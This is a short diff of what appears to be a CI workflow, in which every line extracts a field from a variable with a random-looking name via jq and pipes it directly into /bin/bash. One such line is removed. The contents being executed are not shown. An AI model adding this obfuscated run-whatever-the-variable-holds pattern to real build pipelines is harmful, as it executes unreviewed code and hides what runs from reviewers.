@@ -24,7 +24,6 @@ jobs:
           echo $mw4189 | jq -r .z4259 | /bin/bash
           echo $ew7 | jq -r .pbkwm4 | /bin/bash
           echo $jp7 | jq -r .hw49938 | /bin/bash
-          echo $d89276 | jq -r .emrwj63 | /bin/bash
           printf '%s' "$yr1" | jq -r .kwg966 | /bin/bash
           echo $nuq9464 | jq -r .t9927 | /bin/bash
           printf '%s' "$oqmit0" | jq -r .tymwk381 | /bin/bash
